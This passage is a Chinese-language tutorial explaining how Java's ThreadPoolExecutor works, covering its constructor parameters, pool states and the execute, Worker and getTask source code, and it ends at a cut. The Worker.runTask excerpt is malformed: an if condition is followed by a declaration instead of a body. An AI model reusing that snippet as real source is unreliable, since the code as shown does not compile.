&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;public class ThreadPoolExecutor extends AbstractExecutorService {
    .....
    public ThreadPoolExecutor(int corePoolSize,int maximumPoolSize,long keepAliveTime,TimeUnit unit,
            BlockingQueue&amp;lt;Runnable&amp;gt; workQueue);
 
    public ThreadPoolExecutor(int corePoolSize,int maximumPoolSize,long keepAliveTime,TimeUnit unit,
            BlockingQueue&amp;lt;Runnable&amp;gt; workQueue,ThreadFactory threadFactory);
 
    public ThreadPoolExecutor(int corePoolSize,int maximumPoolSize,long keepAliveTime,TimeUnit unit,
            BlockingQueue&amp;lt;Runnable&amp;gt; workQueue,RejectedExecutionHandler handler);
 
    public ThreadPoolExecutor(int corePoolSize,int maximumPoolSize,long keepAliveTime,TimeUnit unit,
        BlockingQueue&amp;lt;Runnable&amp;gt; workQueue,ThreadFactory threadFactory,RejectedExecutionHandler handler);
    ...
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;从上面的代码可以得知，ThreadPoolExecutor继承了AbstractExecutorService类，并提供了四个构造器，事实上，通过观察每个构造器的源码具体实现，发现前面三个构造器都是调用的第四个构造器进行的初始化工作。&lt;/p&gt;

&lt;p&gt;参数的含义：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;corePoolSize：核心池的大小，这个参数跟后面讲述的线程池的实现原理有非常大的关系。在创建了线程池后，默认情况下，线程池中并没有任何线程，而是等待有任务到来才创建线程去执行任务，除非调用了prestartAllCoreThreads()或者prestartCoreThread()方法，从这2个方法的名字就可以看出，是预创建线程的意思，即在没有任务到来之前就创建corePoolSize个线程或者一个线程。默认情况下，在创建了线程池后，线程池中的线程数为0，当有任务来之后，就会创建一个线程去执行任务，当线程池中的线程数目达到corePoolSize后，就会把到达的任务放到缓存队列当中；&lt;/li&gt;
  &lt;li&gt;maximumPoolSize：线程池最大线程数，这个参数也是一个非常重要的参数，它表示在线程池中最多能创建多少个线程；&lt;/li&gt;
  &lt;li&gt;keepAliveTime：表示线程没有任务执行时最多保持多久时间会终止。默认情况下，只有当线程池中的线程数大于corePoolSize时，keepAliveTime才会起作用，直到线程池中的线程数不大于corePoolSize，即当线程池中的线程数大于corePoolSize时，如果一个线程空闲的时间达到keepAliveTime，则会终止，直到线程池中的线程数不超过corePoolSize。但是如果调用了allowCoreThreadTimeOut(boolean)方法，在线程池中的线程数不大于corePoolSize时，keepAliveTime参数也会起作用，直到线程池中的线程数为0；&lt;/li&gt;
  &lt;li&gt;unit：参数keepAliveTime的时间单位，有7种取值，在TimeUnit类中有7种静态属性：&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;TimeUnit.DAYS;               //天
TimeUnit.HOURS;             //小时
TimeUnit.MINUTES;           //分钟
TimeUnit.SECONDS;           //秒
TimeUnit.MILLISECONDS;      //毫秒
TimeUnit.MICROSECONDS;      //微妙
TimeUnit.NANOSECONDS;       //纳秒
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;workQueue：一个阻塞队列，用来存储等待执行的任务，这个参数的选择也很重要，会对线程池的运行过程产生重大影响，一般来说，这里的阻塞队列有以下几种选择：&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;ArrayBlockingQueue;
LinkedBlockingQueue;
SynchronousQueue;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ArrayBlockingQueue和PriorityBlockingQueue使用较少，一般使用LinkedBlockingQueue和Synchronous。线程池的排队策略与BlockingQueue有关。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;threadFactory：线程工厂，主要用来创建线程；&lt;/li&gt;
  &lt;li&gt;handler：表示当拒绝处理任务时的策略，有以下四种取值：&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;ThreadPoolExecutor.AbortPolicy:丢弃任务并抛出RejectedExecutionException异常。 
ThreadPoolExecutor.DiscardPolicy：也是丢弃任务，但是不抛出异常。 
ThreadPoolExecutor.DiscardOldestPolicy：丢弃队列最前面的任务，然后重新尝试执行任务（重复此过程）
ThreadPoolExecutor.CallerRunsPolicy：由调用线程处理该任务 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;从上面给出的ThreadPoolExecutor类的代码可以知道，ThreadPoolExecutor继承了AbstractExecutorService，我们来看一下AbstractExecutorService的实现：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;public abstract class AbstractExecutorService implements ExecutorService {
 
     
    protected &amp;lt;T&amp;gt; RunnableFuture&amp;lt;T&amp;gt; newTaskFor(Runnable runnable, T value) { };
    protected &amp;lt;T&amp;gt; RunnableFuture&amp;lt;T&amp;gt; newTaskFor(Callable&amp;lt;T&amp;gt; callable) { };
    public Future&amp;lt;?&amp;gt; submit(Runnable task) {};
    public &amp;lt;T&amp;gt; Future&amp;lt;T&amp;gt; submit(Runnable task, T result) { };
    public &amp;lt;T&amp;gt; Future&amp;lt;T&amp;gt; submit(Callable&amp;lt;T&amp;gt; task) { };
    private &amp;lt;T&amp;gt; T doInvokeAny(Collection&amp;lt;? extends Callable&amp;lt;T&amp;gt;&amp;gt; tasks,
                            boolean timed, long nanos)
        throws InterruptedException, ExecutionException, TimeoutException {
    };
    public &amp;lt;T&amp;gt; T invokeAny(Collection&amp;lt;? extends Callable&amp;lt;T&amp;gt;&amp;gt; tasks)
        throws InterruptedException, ExecutionException {
    };
    public &amp;lt;T&amp;gt; T invokeAny(Collection&amp;lt;? extends Callable&amp;lt;T&amp;gt;&amp;gt; tasks,
                           long timeout, TimeUnit unit)
        throws InterruptedException, ExecutionException, TimeoutException {
    };
    public &amp;lt;T&amp;gt; List&amp;lt;Future&amp;lt;T&amp;gt;&amp;gt; invokeAll(Collection&amp;lt;? extends Callable&amp;lt;T&amp;gt;&amp;gt; tasks)
        throws InterruptedException {
    };
    public &amp;lt;T&amp;gt; List&amp;lt;Future&amp;lt;T&amp;gt;&amp;gt; invokeAll(Collection&amp;lt;? extends Callable&amp;lt;T&amp;gt;&amp;gt; tasks,
                                         long timeout, TimeUnit unit)
        throws InterruptedException {
    };
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;AbstractExecutorService是一个抽象类，它实现了ExecutorService接口。&lt;/p&gt;

&lt;p&gt;我们接着看ExecutorService接口的实现：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;public interface ExecutorService extends Executor {
 
    void shutdown();
    boolean isShutdown();
    boolean isTerminated();
    boolean awaitTermination(long timeout, TimeUnit unit)
        throws InterruptedException;
    &amp;lt;T&amp;gt; Future&amp;lt;T&amp;gt; submit(Callable&amp;lt;T&amp;gt; task);
    &amp;lt;T&amp;gt; Future&amp;lt;T&amp;gt; submit(Runnable task, T result);
    Future&amp;lt;?&amp;gt; submit(Runnable task);
    &amp;lt;T&amp;gt; List&amp;lt;Future&amp;lt;T&amp;gt;&amp;gt; invokeAll(Collection&amp;lt;? extends Callable&amp;lt;T&amp;gt;&amp;gt; tasks)
        throws InterruptedException;
    &amp;lt;T&amp;gt; List&amp;lt;Future&amp;lt;T&amp;gt;&amp;gt; invokeAll(Collection&amp;lt;? extends Callable&amp;lt;T&amp;gt;&amp;gt; tasks,
                                  long timeout, TimeUnit unit)
        throws InterruptedException;
 
    &amp;lt;T&amp;gt; T invokeAny(Collection&amp;lt;? extends Callable&amp;lt;T&amp;gt;&amp;gt; tasks)
        throws InterruptedException, ExecutionException;
    &amp;lt;T&amp;gt; T invokeAny(Collection&amp;lt;? extends Callable&amp;lt;T&amp;gt;&amp;gt; tasks,
                    long timeout, TimeUnit unit)
        throws InterruptedException, ExecutionException, TimeoutException;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;而ExecutorService又是继承了Executor接口，我们看一下Executor接口的实现：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;public interface Executor {
    void execute(Runnable command);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Executor是一个顶层接口，在它里面只声明了一个方法execute(Runnable)，返回值为void，参数为Runnable类型，从字面意思可以理解，就是用来执行传进去的任务的；&lt;/p&gt;

&lt;p&gt;然后ExecutorService接口继承了Executor接口，并声明了一些方法：submit、invokeAll、invokeAny以及shutDown等；&lt;/p&gt;

&lt;p&gt;抽象类AbstractExecutorService实现了ExecutorService接口，基本实现了ExecutorService中声明的所有方法；&lt;/p&gt;

&lt;p&gt;然后ThreadPoolExecutor继承了类AbstractExecutorService。&lt;/p&gt;

&lt;p&gt;在ThreadPoolExecutor类中有几个非常重要的方法：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;execute()
submit()
shutdown()
shutdownNow()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;execute()方法实际上是Executor中声明的方法，在ThreadPoolExecutor进行了具体的实现，这个方法是ThreadPoolExecutor的核心方法，通过这个方法可以向线程池提交一个任务，交由线程池去执行。&lt;/p&gt;

&lt;p&gt;submit()方法是在ExecutorService中声明的方法，在AbstractExecutorService就已经有了具体的实现，在ThreadPoolExecutor中并没有对其进行重写，这个方法也是用来向线程池提交任务的，但是它和execute()方法不同，它能够返回任务执行的结果，去看submit()方法的实现，会发现它实际上还是调用的execute()方法，只不过它利用了Future来获取任务执行结果（Future相关内容将在下一篇讲述）。&lt;/p&gt;

&lt;p&gt;shutdown()和shutdownNow()是用来关闭线程池的。&lt;/p&gt;

&lt;p&gt;还有很多其他的方法：&lt;/p&gt;

&lt;p&gt;比如：getQueue() 、getPoolSize() 、getActiveCount()、getCompletedTaskCount()等获取与线程池相关属性的方法&lt;/p&gt;

&lt;h1 id=&quot;线程池实现原理&quot;&gt;线程池实现原理&lt;/h1&gt;

&lt;h2 id=&quot;线程池状态&quot;&gt;&lt;strong&gt;线程池状态&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;在ThreadPoolExecutor中定义了一个volatile变量，另外定义了几个static final变量表示线程池的各个状态：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;volatile int runState;
static final int RUNNING    = 0;
static final int SHUTDOWN   = 1;
static final int STOP       = 2;
static final int TERMINATED = 3;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;runState表示当前线程池的状态，它是一个volatile变量用来保证线程之间的可见性；&lt;/p&gt;

&lt;p&gt;　　下面的几个static final变量表示runState可能的几个取值。&lt;/p&gt;

&lt;p&gt;　　当创建线程池后，初始时，线程池处于RUNNING状态；&lt;/p&gt;

&lt;p&gt;　　如果调用了shutdown()方法，则线程池处于SHUTDOWN状态，此时线程池不能够接受新的任务，它会等待所有任务执行完毕；&lt;/p&gt;

&lt;p&gt;　　如果调用了shutdownNow()方法，则线程池处于STOP状态，此时线程池不能接受新的任务，并且会去尝试终止正在执行的任务；&lt;/p&gt;

&lt;p&gt;　　当线程池处于SHUTDOWN或STOP状态，并且所有工作线程已经销毁，任务缓存队列已经清空或执行结束后，线程池被设置为TERMINATED状态。&lt;/p&gt;

&lt;h2 id=&quot;任务的执行&quot;&gt;&lt;strong&gt;任务的执行&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;在了解将任务提交给线程池到任务执行完毕整个过程之前，我们先来看一下ThreadPoolExecutor类中其他的一些比较重要成员变量：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;private final BlockingQueue&amp;lt;Runnable&amp;gt; workQueue;              //任务缓存队列，用来存放等待执行的任务
private final ReentrantLock mainLock = new ReentrantLock();   //线程池的主要状态锁，对线程池状态（比如线程池大小
                                                              //、runState等）的改变都要使用这个锁
private final HashSet&amp;lt;Worker&amp;gt; workers = new HashSet&amp;lt;Worker&amp;gt;();  //用来存放工作集
 
private volatile long  keepAliveTime;    //线程存货时间   
private volatile boolean allowCoreThreadTimeOut;   //是否允许为核心线程设置存活时间
private volatile int   corePoolSize;     //核心池的大小（即线程池中的线程数目大于这个参数时，提交的任务会被放进任务缓存队列）
private volatile int   maximumPoolSize;   //线程池最大能容忍的线程数
 
private volatile int   poolSize;       //线程池中当前的线程数
 
private volatile RejectedExecutionHandler handler; //任务拒绝策略
 
private volatile ThreadFactory threadFactory;   //线程工厂，用来创建线程
 
private int largestPoolSize;   //用来记录线程池中曾经出现过的最大线程数
 
private long completedTaskCount;   //用来记录已经执行完毕的任务个数
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;每个变量的作用都已经标明出来了，这里要重点解释一下corePoolSize、maximumPoolSize、largestPoolSize三个变量。&lt;/p&gt;

&lt;p&gt;　　corePoolSize在很多地方被翻译成核心池大小，其实我的理解这个就是线程池的大小。举个简单的例子：&lt;/p&gt;

&lt;p&gt;　　假如有一个工厂，工厂里面有10个工人，每个工人同时只能做一件任务。&lt;/p&gt;

&lt;p&gt;　　因此只要当10个工人中有工人是空闲的，来了任务就分配给空闲的工人做；&lt;/p&gt;

&lt;p&gt;　　当10个工人都有任务在做时，如果还来了任务，就把任务进行排队等待；&lt;/p&gt;

&lt;p&gt;　　如果说新任务数目增长的速度远远大于工人做任务的速度，那么此时工厂主管可能会想补救措施，比如重新招4个临时工人进来；&lt;/p&gt;

&lt;p&gt;　　然后就将任务也分配给这4个临时工人做；&lt;/p&gt;

&lt;p&gt;　　如果说着14个工人做任务的速度还是不够，此时工厂主管可能就要考虑不再接收新的任务或者抛弃前面的一些任务了。&lt;/p&gt;

&lt;p&gt;　　当这14个工人当中有人空闲时，而新任务增长的速度又比较缓慢，工厂主管可能就考虑辞掉4个临时工了，只保持原来的10个工人，毕竟请额外的工人是要花钱的。&lt;/p&gt;

&lt;p&gt;　　这个例子中的corePoolSize就是10，而maximumPoolSize就是14（10+4）。&lt;/p&gt;

&lt;p&gt;　　也就是说corePoolSize就是线程池大小，maximumPoolSize在我看来是线程池的一种补救措施，即任务量突然过大时的一种补救措施。&lt;/p&gt;

&lt;p&gt;　　不过为了方便理解，在本文后面还是将corePoolSize翻译成核心池大小。&lt;/p&gt;

&lt;p&gt;　　largestPoolSize只是一个用来起记录作用的变量，用来记录线程池中曾经有过的最大线程数目，跟线程池的容量没有任何关系。&lt;/p&gt;

&lt;p&gt;　　下面我们进入正题，看一下任务从提交到最终执行完毕经历了哪些过程。&lt;/p&gt;

&lt;p&gt;　　在ThreadPoolExecutor类中，最核心的任务提交方法是execute()方法，虽然通过submit也可以提交任务，但是实际上submit方法里面最终调用的还是execute()方法，所以我们只需要研究execute()方法的实现原理即可：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;public void execute(Runnable command) {
    if (command == null)
        throw new NullPointerException();
    if (poolSize &amp;gt;= corePoolSize || !addIfUnderCorePoolSize(command)) {
        if (runState == RUNNING &amp;amp;&amp;amp; workQueue.offer(command)) {
            if (runState != RUNNING || poolSize == 0)
                ensureQueuedTaskHandled(command);
        }
        else if (!addIfUnderMaximumPoolSize(command))
            reject(command); // is shutdown or saturated
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;上面的代码可能看起来不是那么容易理解，下面我们一句一句解释：&lt;/p&gt;

&lt;p&gt;　　首先，判断提交的任务command是否为null，若是null，则抛出空指针异常；&lt;/p&gt;

&lt;p&gt;　　接着是这句，这句要好好理解一下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;if (poolSize &amp;gt;= corePoolSize || !addIfUnderCorePoolSize(command))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;由于是或条件运算符，所以先计算前半部分的值，如果线程池中当前线程数不小于核心池大小，那么就会直接进入下面的if语句块了。&lt;/p&gt;

&lt;p&gt;　　如果线程池中当前线程数小于核心池大小，则接着执行后半部分，也就是执行&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;addIfUnderCorePoolSize(command)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果执行完addIfUnderCorePoolSize这个方法返回false，则继续执行下面的if语句块，否则整个方法就直接执行完毕了。&lt;/p&gt;

&lt;p&gt;　　如果执行完addIfUnderCorePoolSize这个方法返回false，然后接着判断：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;if (runState == RUNNING &amp;amp;&amp;amp; workQueue.offer(command))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果当前线程池处于RUNNING状态，则将任务放入任务缓存队列；如果当前线程池不处于RUNNING状态或者任务放入缓存队列失败，则执行：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;addIfUnderMaximumPoolSize(command)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果执行addIfUnderMaximumPoolSize方法失败，则执行reject()方法进行任务拒绝处理。&lt;/p&gt;

&lt;p&gt;　　回到前面：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;if (runState == RUNNING &amp;amp;&amp;amp; workQueue.offer(command))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这句的执行，如果说当前线程池处于RUNNING状态且将任务放入任务缓存队列成功，则继续进行判断：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;if (runState != RUNNING || poolSize == 0)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这句判断是为了防止在将此任务添加进任务缓存队列的同时其他线程突然调用shutdown或者shutdownNow方法关闭了线程池的一种应急措施。如果是这样就执行：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;ensureQueuedTaskHandled(command)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;进行应急处理，从名字可以看出是保证 添加到任务缓存队列中的任务得到处理。&lt;/p&gt;

&lt;p&gt;　　我们接着看2个关键方法的实现：addIfUnderCorePoolSize和addIfUnderMaximumPoolSize：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;private boolean addIfUnderCorePoolSize(Runnable firstTask) {
    Thread t = null;
    final ReentrantLock mainLock = this.mainLock;
    mainLock.lock();
    try {
        if (poolSize &amp;lt; corePoolSize &amp;amp;&amp;amp; runState == RUNNING)
            t = addThread(firstTask);        //创建线程去执行firstTask任务   
        } finally {
        mainLock.unlock();
    }
    if (t == null)
        return false;
    t.start();
    return true;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这个是addIfUnderCorePoolSize方法的具体实现，从名字可以看出它的意图就是当低于核心吃大小时执行的方法。下面看其具体实现，首先获取到锁，因为这地方涉及到线程池状态的变化，先通过if语句判断当前线程池中的线程数目是否小于核心池大小，有朋友也许会有疑问：前面在execute()方法中不是已经判断过了吗，只有线程池当前线程数目小于核心池大小才会执行addIfUnderCorePoolSize方法的，为何这地方还要继续判断？原因很简单，前面的判断过程中并没有加锁，因此可能在execute方法判断的时候poolSize小于corePoolSize，而判断完之后，在其他线程中又向线程池提交了任务，就可能导致poolSize不小于corePoolSize了，所以需要在这个地方继续判断。然后接着判断线程池的状态是否为RUNNING，原因也很简单，因为有可能在其他线程中调用了shutdown或者shutdownNow方法。然后就是执行&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;t = addThread(firstTask);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这个方法也非常关键，传进去的参数为提交的任务，返回值为Thread类型。然后接着在下面判断t是否为空，为空则表明创建线程失败（即poolSize&amp;gt;=corePoolSize或者runState不等于RUNNING），否则调用t.start()方法启动线程。&lt;/p&gt;

&lt;p&gt;　　我们来看一下addThread方法的实现：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;private Thread addThread(Runnable firstTask) {
    Worker w = new Worker(firstTask);
    Thread t = threadFactory.newThread(w);  //创建一个线程，执行任务   
    if (t != null) {
        w.thread = t;            //将创建的线程的引用赋值为w的成员变量       
        workers.add(w);
        int nt = ++poolSize;     //当前线程数加1       
        if (nt &amp;gt; largestPoolSize)
            largestPoolSize = nt;
    }
    return t;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在addThread方法中，首先用提交的任务创建了一个Worker对象，然后调用线程工厂threadFactory创建了一个新的线程t，然后将线程t的引用赋值给了Worker对象的成员变量thread，接着通过workers.add(w)将Worker对象添加到工作集当中。&lt;/p&gt;

&lt;p&gt;　　下面我们看一下Worker类的实现：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;private final class Worker implements Runnable {
    private final ReentrantLock runLock = new ReentrantLock();
    private Runnable firstTask;
    volatile long completedTasks;
    Thread thread;
    Worker(Runnable firstTask) {
        this.firstTask = firstTask;
    }
    boolean isActive() {
        return runLock.isLocked();
    }
    void interruptIfIdle() {
        final ReentrantLock runLock = this.runLock;
        if (runLock.tryLock()) {
            try {
        if (thread != Thread.currentThread())
        thread.interrupt();
            } finally {
                runLock.unlock();
            }
        }
    }
    void interruptNow() {
        thread.interrupt();
    }
 
    private void runTask(Runnable task) {
        final ReentrantLock runLock = this.runLock;
        runLock.lock();
        try {
            if (runState &amp;lt; STOP &amp;amp;&amp;amp;
                Thread.interrupted() &amp;amp;&amp;amp;
                runState &amp;gt;= STOP)
            boolean ran = false;
            beforeExecute(thread, task);   //beforeExecute方法是ThreadPoolExecutor类的一个方法，没有具体实现，用户可以根据
            //自己需要重载这个方法和后面的afterExecute方法来进行一些统计信息，比如某个任务的执行时间等           
            try {
                task.run();
                ran = true;
                afterExecute(task, null);
                ++completedTasks;
            } catch (RuntimeException ex) {
                if (!ran)
                    afterExecute(task, ex);
                throw ex;
            }
        } finally {
            runLock.unlock();
        }
    }
 
    public void run() {
        try {
            Runnable task = firstTask;
            firstTask = null;
            while (task != null || (task = getTask()) != null) {
                runTask(task);
                task = null;
            }
        } finally {
            workerDone(this);   //当任务队列中没有任务时，进行清理工作       
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;它实际上实现了Runnable接口，因此上面的Thread t = threadFactory.newThread(w);效果跟下面这句的效果基本一样：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;Thread t = new Thread(w);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;相当于传进去了一个Runnable任务，在线程t中执行这个Runnable。&lt;/p&gt;

&lt;p&gt;　　既然Worker实现了Runnable接口，那么自然最核心的方法便是run()方法了：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;public void run() {
    try {
        Runnable task = firstTask;
        firstTask = null;
        while (task != null || (task = getTask()) != null) {
            runTask(task);
            task = null;
        }
    } finally {
        workerDone(this);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;从run方法的实现可以看出，它首先执行的是通过构造器传进来的任务firstTask，在调用runTask()执行完firstTask之后，在while循环里面不断通过getTask()去取新的任务来执行，那么去哪里取呢？自然是从任务缓存队列里面去取，getTask是ThreadPoolExecutor类中的方法，并不是Worker类中的方法，下面是getTask方法的实现：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;Runnable getTask() {
    for (;;) {
        try {
            int state = runState;
            if (state &amp;gt; SHUTDOWN)
                return null;
            Runnable r;
            if (state == SHUTDOWN)  // Help drain queue
                r = workQueue.poll();
            else if (poolSize &amp;gt; corePoolSize || allowCoreThreadTimeOut) //如果线程数大于核心池大小或者允许为核心池线程设置空闲时间，
                //则通过poll取任务，若等待一定的时间取不到任务，则返回null
                r = workQueue.poll(keepAliveTime, TimeUnit.NANOSECONDS);
            else
                r = workQueue.take();
            if (r != null)
                return r;
            if (workerCanExit()) {    //如果没取到任务，即r为null，则判断当前的worker是否可以退出
                if (runState &amp;gt;= SHUTDOWN) // Wake up others
                    interruptIdleWorkers();   //中断处于空闲状态的worker
                return null;
            }
            // Else retry
        } catch (InterruptedException ie) {
            // On interruption, re-check runState
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在getTask中，先判断当前线程池状态，如果runState大于SHUTDOWN（即为STOP或者TERMINATED），则直接返回null。&lt;/p&gt;

&lt;p&gt;　　如果runState为SHUTDOWN或者RUNNING，则从任务缓存队列取任务。&lt;/p&gt;

&lt;p&gt;　　如果当前线程池的线程数大于核心池大小corePoolSize或者允许为核心池中的线程设置空闲存活时间，则调用poll(time,timeUnit)来取任务，这个方法会等待一定的时间，如果取不到任务就返回null。&lt;/p&gt;

&lt;p&gt;　　然后判断取到的任务r是否为null，为null则通过调用workerCanExit()方法来判断当前worker是否可以退出，我们看一下workerCanExit()的实现：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;private boolean workerCanExit() {
    final ReentrantLock mainLock = this.mainLock;
    mainLock.lock();
    boolean canExit;
    //如果runState大于等于STOP，或者任务缓存队列为空了
    //或者  允许为核心池线程设置空闲存活时间并且线程池中的线程数目大于1
    try {
        canExit = runState &amp;gt;= STOP ||
            workQueue.isEmpty() ||
            (allowCoreThreadTimeOut &amp;amp;&amp;amp;
             poolSize &amp;gt; Math.max(1, corePoolSize));
    } finally {
        mainLock.unlock();
    }
    return canExit;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;也就是说如果线程池处于STOP状态、或者任务队列已为空或者允许为核心池线程设置空闲存活时间并且线程数大于1时，允许worker退出。如果允许worker退出，则调用interruptIdleWorkers()中断处于空闲状态的worker，我们看一下interruptIdleWorkers()的实现：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;void interruptIdleWorkers() {
    final ReentrantLock mainLock = this.mainLock;
    mainLock.lock();
    try {
        for (Worker w : workers)  //实际上调用的是worker的interruptIfIdle()方法
            w.interruptIfIdle();
    } finally {
        mainLock.unlock();
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;从实现可以看出，它实际上调用的是worker的interruptIfIdle()方法，在worker的interruptIfIdle()方法中：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;void interruptIfIdle() {
    final ReentrantLock runLock = this.runLock;
    if (runLock.tryLock()) {    //注意这里，是调用tryLock()来获取锁的，因为如果当前worker正在执行任务，锁已经被获取了，是无法获取到锁的
                                //如果成功获取了锁，说明当前worker处于空闲状态
        try {
    if (thread != Thread.currentThread())  
    thread.interrupt();
        } finally {
            runLock.unlock();
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这里有一个非常巧妙的设计方式，假如我们来设计线程池，可能会有一个任务分派线程，当发现有线程空闲时，就从任务缓存队列中取一个任务交给空闲线程执行。但是在这里，并没有采用这样的方式，因为这样会要额外地对任务分派线程进行管理，无形地会增加难度和复杂度，这里直接让执行完任务的线程去任务缓存队列里面取任务来执行。&lt;/p&gt;

&lt;p&gt;　我们再看addIfUnderMaximumPoolSize方法的实现，这个方法的实现思想和addIfUnderCorePoolSize方法的实现思想非常相似，唯一的区别在于addIfUnderMaximumPoolSize方法是在线程池中的线程数达到了核心池大小并且往任务队列中添加任务失败的情况下执行的：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;private boolean addIfUnderMaximumPoolSize(Runnable firstTask) {
    Thread t = null;
    final ReentrantLock mainLock = this.mainLock;
    mainLock.lock();
    try {
        if (poolSize &amp;lt; maximumPoolSize &amp;amp;&amp;amp; runState == RUNNING)
            t = addThread(firstTask);
    } finally {
        mainLock.unlock();
    }
    if (t == null)
        return false;
    t.start();
    return true;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;看到没有，其实它和addIfUnderCorePoolSize方法的实现基本一模一样，只是if语句判断条件中的poolSize &amp;lt; maximumPoolSize不同而已。&lt;/p&gt;

&lt;p&gt;　　到这里，大部分朋友应该对任务提交给线程池之后到被执行的整个过程有了一个基本的了解，下面总结一下：&lt;/p&gt;

&lt;p&gt;　　1）首先，要清楚corePoolSize和maximumPoolSize的含义；&lt;/p&gt;

&lt;p&gt;　　2）其次，要知道Worker是用来起到什么作用的；&lt;/p&gt;

&lt;p&gt;　　3）要知道任务提交给线程池之后的处理策略，这里总结一下主要有4点：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;如果当前线程池中的线程数目小于corePoolSize，则每来一个任务，就会创建一个线程去执行这个任务；&lt;/li&gt;
  &lt;li&gt;如果当前线程池中的线程数目&amp;gt;=corePoolSize，则每来一个任务，会尝试将其添加到任务缓存队列当中，若添加成功，则该任务会等待空闲线程将其取出去执行；若添加失败（一般来说是任务缓存队列已满），则会尝试创建新的线程去执行这个任务；&lt;/li&gt;
  &lt;li&gt;如果当前线程池中的线程数目达到maximumPoolSize，则会采取任务拒绝策略进行处理；&lt;/li&gt;
  &lt;li&gt;如果线程池中的线程数量大于  corePoolSize时，如果某线程空闲时间超过keepAliveTime，线程将被终止，直至线程池中的线程数目不大于corePoolSize；如果允许为核心池中的线程设置存活时间，那么核心池中的线程空闲时间超过keepAliveTime，线程也会被终止&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;线程池中的线程初始化&quot;&gt;&lt;strong&gt;线程池中的线程初始化&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;默认情况下，创建线程池之后，线程池中是没有线程的，需要提交任务之后才会创建线程。&lt;/p&gt;

&lt;p&gt;　　在实际中如果需要线程池创建之后立即创建线程，可以通过以下两个方法办到：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;prestartCoreThread()：初始化一个核心线程；&lt;/li&gt;
  &lt;li&gt;prestartAllCoreThreads()：初始化所有核心线程&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;　　下面是这2个方法的实现：&lt;/p&gt;

